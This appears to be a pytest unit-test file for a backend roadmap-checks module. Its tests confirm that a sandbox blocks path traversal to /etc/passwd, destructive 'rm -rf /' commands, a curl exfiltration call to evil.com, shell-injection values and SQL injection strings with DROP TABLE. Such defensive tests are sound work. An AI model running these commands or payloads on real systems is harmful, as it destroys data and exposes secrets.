"""Unit tests for backend/core/roadmap_checks.py.

Tests each check type plus 5 sandbox-escape attempts for command and db_query.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from backend.core.roadmap_checks import (
    _check_command,
    _check_db_query,
    _check_file_exists,
    _check_http_ok,
    _check_smoke_list,
    evaluate_check,
)
from backend.core.roadmap_loader import Check

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

REPO_ROOT = Path(__file__).resolve().parents[2]


def make_check(**kwargs) -> Check:
    return Check(**kwargs)


# ---------------------------------------------------------------------------
# file_exists
# ---------------------------------------------------------------------------


class TestFileExistsCheck:
    def test_file_exists_ok(self, tmp_path):
        # Use README.md which should exist
        readme = REPO_ROOT / "README.md"
        if not readme.exists():
            readme.write_text("test")
        check = make_check(type="file_exists", path="README.md")
        result, detail = _check_file_exists(check)
        assert result == "ok"

    def test_file_exists_missing(self):
        check = make_check(type="file_exists", path="nonexistent_totally_fake_file.xyz")
        result, detail = _check_file_exists(check)
        assert result == "fail"
        assert "nonexistent_totally_fake_file.xyz" in detail

    def test_file_exists_blocks_absolute_path(self):
        check = make_check(type="file_exists", path="/etc/passwd")
        result, detail = _check_file_exists(check)
        assert result == "error"
        assert "absolute-path-blocked" in detail

    def test_file_exists_blocks_dotdot(self):
        check = make_check(type="file_exists", path="../../../etc/shadow")
        result, detail = _check_file_exists(check)
        assert result == "error"
        assert "path-traversal-blocked" in detail

    def test_file_exists_blocks_dotdot_in_middle(self):
        check = make_check(type="file_exists", path="scripts/../../../etc/passwd")
        result, detail = _check_file_exists(check)
        assert result == "error"
        assert "path-traversal-blocked" in detail

    def test_file_exists_missing_path(self):
        check = make_check(type="file_exists", path=None)
        result, detail = _check_file_exists(check)
        assert result == "error"
        assert "missing-path" in detail


# ---------------------------------------------------------------------------
# command
# ---------------------------------------------------------------------------


class TestCommandCheck:
    def test_command_true_ok(self):
        check = make_check(type="command", cmd=["true"])
        result, detail = _check_command(check)
        assert result == "ok"

    def test_command_false_fail(self):
        check = make_check(type="command", cmd=["false"])
        result, detail = _check_command(check)
        assert result == "fail"

    def test_command_must_be_list_not_string(self):
        # Pydantic accepts list[str], but a str at runtime should be caught
        check = Check.model_construct(type="command", cmd="rm -rf /")
        result, detail = _check_command(check)
        assert result == "error"
        assert "cmd-must-be-list" in detail

    def test_command_empty_list_error(self):
        check = make_check(type="command", cmd=[])
        result, detail = _check_command(check)
        assert result == "error"
        assert "empty-cmd" in detail

    # --- 5 sandbox escape attempts ---

    def test_sandbox_escape_rm_blocked(self):
        """rm is on the blocklist."""
        check = make_check(type="command", cmd=["rm", "-rf", "/"])
        result, detail = _check_command(check)
        assert result == "error"
        assert "blocked-command" in detail

    def test_sandbox_escape_sudo_blocked(self):
        check = make_check(type="command", cmd=["sudo", "rm", "-rf", "/"])
        result, detail = _check_command(check)
        assert result == "error"
        assert "blocked-command" in detail

    def test_sandbox_escape_bash_blocked(self):
        """Shell invocation blocked."""
        check = make_check(type="command", cmd=["bash", "-c", "rm -rf /"])
        result, detail = _check_command(check)
        assert result == "error"
        assert "blocked-command" in detail

    def test_sandbox_escape_python_blocked(self):
        check = make_check(
            type="command", cmd=["python3", "-c", "import os; os.system('rm -rf /')"]
        )
        result, detail = _check_command(check)
        assert result == "error"
        assert "blocked-command" in detail

    def test_sandbox_escape_curl_blocked(self):
        """Network exfiltration attempt."""
        check = make_check(type="command", cmd=["curl", "http://evil.com/exfil"])
        result, detail = _check_command(check)
        assert result == "error"
        assert "blocked-command" in detail

    def test_command_no_shell_injection(self):
        """shell=False means shell metacharacters are inert."""
        # This would exec "ls; rm -rf /" as a literal program name — should fail
        check = make_check(type="command", cmd=["ls; rm -rf /"])
        result, detail = _check_command(check)
        # Either error (command-not-found) or fail — but not ok and not destructive
        assert result in ("error", "fail")

    def test_command_timeout_returns_error(self):
        """Simulate timeout."""
        import subprocess

        with patch(
            "backend.core.roadmap_checks.subprocess.run",
            side_effect=subprocess.TimeoutExpired("sleep", 5),
        ):
            check = make_check(type="command", cmd=["sleep", "10"])
            result, detail = _check_command(check)
        assert result == "error"
        assert detail == "timeout"

    def test_command_missing_cmd(self):
        check = make_check(type="command", cmd=None)
        result, detail = _check_command(check)
        assert result == "error"
        assert "missing-cmd" in detail


# ---------------------------------------------------------------------------
# http_ok
# ---------------------------------------------------------------------------


class TestHttpOkCheck:
    def test_http_ok_external_url_blocked(self):
        check = make_check(type="http_ok", url="https://example.com")
        result, detail = _check_http_ok(check)
        assert result == "error"
        assert detail == "external-url-blocked"

    def test_http_ok_http_external_blocked(self):
        check = make_check(type="http_ok", url="http://example.com")
        result, detail = _check_http_ok(check)
        assert result == "error"
        assert detail == "external-url-blocked"

    def test_http_ok_localhost_allowed(self):
        """Mock httpx to return 200."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        with patch("backend.core.roadmap_checks.httpx.get", return_value=mock_resp):
            check = make_check(type="http_ok", url="http://localhost:8010/api/v1/health")
            result, detail = _check_http_ok(check)
        assert result == "ok"

    def test_http_ok_127_allowed(self):
        """127.0.0.1 URLs are allowed."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        with patch("backend.core.roadmap_checks.httpx.get", return_value=mock_resp):
            check = make_check(type="http_ok", url="http://127.0.0.1:8010/health")
            result, detail = _check_http_ok(check)
        assert result == "ok"

    def test_http_ok_non_2xx_fail(self):
        mock_resp = MagicMock()
        mock_resp.status_code = 404
        with patch("backend.core.roadmap_checks.httpx.get", return_value=mock_resp):
            check = make_check(type="http_ok", url="http://localhost:8010/notfound")
            result, detail = _check_http_ok(check)
        assert result == "fail"
        assert "404" in detail

    def test_http_ok_missing_url(self):
        check = make_check(type="http_ok", url=None)
        result, detail = _check_http_ok(check)
        assert result == "error"
        assert "missing-url" in detail

    def test_http_ok_timeout(self):
        import httpx

        with patch(
            "backend.core.roadmap_checks.httpx.get",
            side_effect=httpx.TimeoutException("timeout"),
        ):
            check = make_check(type="http_ok", url="http://localhost:9999/slow")
            result, detail = _check_http_ok(check)
        assert result == "error"
        assert detail == "timeout"


# ---------------------------------------------------------------------------
# db_query
# ---------------------------------------------------------------------------


class TestDbQueryCheck:
    def test_db_query_rejects_semicolon(self):
        """SELECT 1; DROP TABLE chunks; -- must be rejected."""
        check = make_check(type="db_query", sql="SELECT 1; DROP TABLE chunks; --")
        result, detail = _check_db_query(check)
        assert result == "error"
        assert detail == "unsafe-sql"

    def test_db_query_rejects_double_dash(self):
        check = make_check(type="db_query", sql="SELECT 1 -- comment")
        result, detail = _check_db_query(check)
        assert result == "error"
        assert detail == "unsafe-sql"

    def test_db_query_rejects_block_comment(self):
        check = make_check(type="db_query", sql="SELECT /* evil */ 1")
        result, detail = _check_db_query(check)
        assert result == "error"
        assert detail == "unsafe-sql"

    # 2 more db_query sandbox escape attempts

    def test_db_query_drop_via_semicolon_rejected(self):
        """Multi-statement injection attempt."""
        check = make_check(type="db_query", sql="SELECT 1; DROP TABLE chunks")
        result, detail = _check_db_query(check)
        assert result == "error"
        assert detail == "unsafe-sql"

    def test_db_query_comment_injection_rejected(self):
        """Comment-based injection."""
        check = make_check(
            type="db_query", sql="SELECT count(*) FROM chunks WHERE id='x'--' AND 1=1"
        )
        result, detail = _check_db_query(check)
        assert result == "error"
        assert detail == "unsafe-sql"

    def test_db_query_valid_against_state_db(self):
        """Valid query against real state.db returns ok."""
        from backend.core.roadmap_checks import _STATE_DB

        if not _STATE_DB.exists():
            pytest.skip("state.db not available")
        check = make_check(type="db_query", sql="SELECT count(*) FROM chunks WHERE status='DONE'")
        result, detail = _check_db_query(check)
        # Either ok (if DONE chunks exist) or fail (zero result) — not error
        assert result in ("ok", "fail")

    def test_db_query_missing_sql(self):
        check = make_check(type="db_query", sql=None)
        result, detail = _check_db_query(check)
        assert result == "error"
        assert "missing-sql" in detail

    def test_db_query_unknown_target(self):
        check = make_check(type="db_query", sql="SELECT 1", target="production_db")
        result, detail = _check_db_query(check)
        assert result == "error"
        assert "unknown-db-target" in detail

    def test_db_query_state_db_not_found(self, tmp_path):
        """When state.db is missing, returns error."""
        with patch("backend.core.roadmap_checks._STATE_DB", tmp_path / "nonexistent.db"):
            check = make_check(type="db_query", sql="SELECT 1")
            result, detail = _check_db_query(check)
        assert result == "error"
        assert "state-db-not-found" in detail


# ---------------------------------------------------------------------------
# smoke_list
# ---------------------------------------------------------------------------


class TestSmokeListCheck:
    def test_smoke_list_default_slow_skipped(self):
        """Without evaluate_slow, always returns slow-skipped."""
        check = make_check(type="smoke_list", file="scripts/smoke-endpoints.txt")
        result, detail = _check_smoke_list(check, evaluate_slow=False)
        assert result == "slow-skipped"
        assert detail == ""

    def test_smoke_list_unsafe_path_blocked_absolute(self):
        check = make_check(type="smoke_list", file="/etc/passwd")
        result, detail = _check_smoke_list(check, evaluate_slow=True)
        assert result == "error"
        assert "unsafe-list-path" in detail

    def test_smoke_list_unsafe_path_blocked_outside_scripts(self):
        check = make_check(type="smoke_list", file="docs/some-file.txt")
        result, detail = _check_smoke_list(check, evaluate_slow=True)
        assert result == "error"
        assert "unsafe-list-path" in detail

    def test_smoke_list_unsafe_dotdot_blocked(self):
        check = make_check(type="smoke_list", file="scripts/../etc/passwd")
        result, detail = _check_smoke_list(check, evaluate_slow=True)
        assert result == "error"
        assert "unsafe-list-path" in detail

    def test_smoke_list_runs_when_evaluate_slow_true(self):
        """With evaluate_slow=True, runs smoke probe and returns ok or fail."""
        with patch(
            "backend.core.roadmap_checks._run_smoke_probe",
            return_value={
                "check": "ok",
                "detail": "total=3 passed=3 hard_fail=0 soft_skip=0",
            },
        ):
            check = make_check(type="smoke_list", file="scripts/smoke-endpoints.txt")
            # Clear cache first
            from backend.core.roadmap_checks import _smoke_cache

            _smoke_cache.clear()
            result, detail = _check_smoke_list(check, evaluate_slow=True)
        assert result == "ok"

    def test_smoke_list_fail_on_hard_fail(self):
        """hard_fail>0 returns fail."""
        with patch(
            "backend.core.roadmap_checks._run_smoke_probe",
            return_value={
                "check": "fail",
                "detail": "total=3 passed=2 hard_fail=1 soft_skip=0",
            },
        ):
            check = make_check(type="smoke_list", file="scripts/smoke-endpoints.txt")
            from backend.core.roadmap_checks import _smoke_cache

            _smoke_cache.clear()
            result, detail = _check_smoke_list(check, evaluate_slow=True)
        assert result == "fail"
        assert "hard_fail=1" in detail


# ---------------------------------------------------------------------------
# evaluate_check (top-level dispatcher)
# ---------------------------------------------------------------------------


class TestEvaluateCheck:
    def test_evaluate_none_check(self):
        result, detail = evaluate_check(None)
        assert result == "ok"
        assert detail == ""

    def test_evaluate_unknown_type(self):
        check = make_check(type="unknown_type")
        result, detail = evaluate_check(check)
        assert result == "error"
        assert "unknown-check-type" in detail

    def test_evaluate_file_exists_readme(self):
        readme = REPO_ROOT / "README.md"
        if not readme.exists():
            pytest.skip("README.md not present")
        check = make_check(type="file_exists", path="README.md")
        result, detail = evaluate_check(check)
        assert result == "ok"

    def test_evaluate_command_true(self):
        check = make_check(type="command", cmd=["true"])
        result, detail = evaluate_check(check)
        assert result == "ok"

    def test_evaluate_command_false(self):
        check = make_check(type="command", cmd=["false"])
        result, detail = evaluate_check(check)
        assert result == "fail"
